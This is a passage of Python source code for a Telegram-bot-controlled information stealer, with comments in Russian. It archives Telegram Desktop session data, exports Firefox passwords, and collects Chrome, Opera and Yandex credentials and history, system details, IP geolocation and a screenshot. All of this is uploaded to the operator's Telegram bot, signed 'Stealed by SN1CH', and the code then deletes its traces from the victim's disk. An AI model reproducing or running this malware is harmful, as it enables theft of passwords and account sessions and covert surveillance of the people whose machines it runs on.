                tg_directory2 = "C:\\Users\\" + getpass.getuser() + "\\AppData\\Roaming\\Telegram Desktop\\tdata\\"
                doc2 = shutil.make_archive('tg2', 'zip', tg_directory2)  # Делаем архив
            except:
                pass
            try:
                tg_directory3 = 'C:\\Program Files\\Telegram Desktop\\tdata\\'
                doc3 = shutil.make_archive('tg3', 'zip', tg_directory3)  # Делаем архив
            except:
                pass

            url = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'

            ################################################################################
            #                                 FireFox                                      #
            ################################################################################

            try:
                mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
                mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
                profile = configparser.ConfigParser()
                profile.read(mozilla_profile_ini)
                data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
                subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
                subprocess_return = subprocesss.stdout.read()
                passwords = str(subprocess_return)
                with open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "a",
                          encoding="utf-8") as file:
                    file.write(passwords.replace('\\r', '\n'))
                f = open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "rb")
            except:
                pass

            ################################################################################
            #                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
            ################################################################################
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            }
            drives = str(win32api.GetLogicalDriveStrings())
            drives = str(drives.split('\000')[:-1])

            try:
                ip = requests.get('https://api.ipify.org').text
                urlloc = 'http://ip-api.com/json/' + ip
                location1 = requests.get(urlloc, headers=headers).text
            except:
                print('')
            try:
                all_data = "Time: " + time.asctime() + '\n' + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(
                    namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(
                    ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem) + str(
                    allstorage) + str(usedstorage) + str(freestorage)
                file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+")
                file.write(all_data)
                file.write('\nАнтивирус: ' + str(Antiviruses))
            except:
                print('Что то то с alldata не так')
            try:
                file.write(str(gpu_name) + str(gpu_free_memory) + str(gpu_total_memory) + str(gpu_temperature))
            except:
                pass

            file.close()

            ################################################################################
            #                             ДЕЛАЕМ СКРИНШОТ                                  #
            ################################################################################
            screen = ImageGrab.grab()
            screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

            ################################################################################
            #                             ПОЛУЧАЕМ ДИРЕКТОРИИ                              #
            ################################################################################
            webcam = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\4543t353454.png')

            alldata_direct = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
            screenshot = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
            history_direct = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.txt')
            chromepass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromepasswords.txt')

            history_direct_opera = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.txt')
            operapass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operapasswords.txt')

            history_direct_yandex = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.txt')
            yandexpass = (r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexpasswords.txt')
            ################################################################################
            #                              ОТПРАВКА                                        #
            ################################################################################
            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(doc1, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')
            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(doc2, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(doc3, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(webcam, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(alldata_direct, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(screenshot, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(history_direct, 'rb')})

            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(chromepass, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(history_direct_opera, 'rb')})

            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(operapass, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(history_direct_yandex, 'rb')})

            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={"document": open(yandexpass, 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(url, files={
                        "document": open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', 'rb')})
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')

            try:
                with requests.Session() as session:
                    session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    session.headers[
                        'User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                    session.post(
                        "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=html&text=" + 'Stealed by SN1CH')
            except:
                print('Файл не получилось отправить скорее всего его не существует либо у тебя медленный интернет')
            ################################################################################
            #                              УДАЛЕНИЕ УЛИК :)                                #
            ################################################################################

            time.sleep(2)
            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.png')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\4543t353454.png')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromepasswords.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\history.db')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\Loginvault.db')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\operapasswords.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOPERA.txt')
            except:
                pass
            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyOpera.db')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultOPERA.db')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandexpasswords.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\historyYANDEX.db')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt')
            except:
                pass

            try:
                os.remove('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\LoginvaultYANDEX.db')
            except:
                pass

            try:
                os.remove('tg1.zip')
            except:
                pass

            try:
                os.remove('tg2.zip')
            except:
                pass

            try:
                os.remove('tg3.zip')
            except:
                pass

        except Exception as e:

            bot.send_message(int(CHAT_ID), f'STEAL ERROR: {e}')

    else:

        bot.send_message(int(CHAT_ID), 'access denied')


if __name__ == '__main__':
    bot.polling(none_stop=True, interval=0)
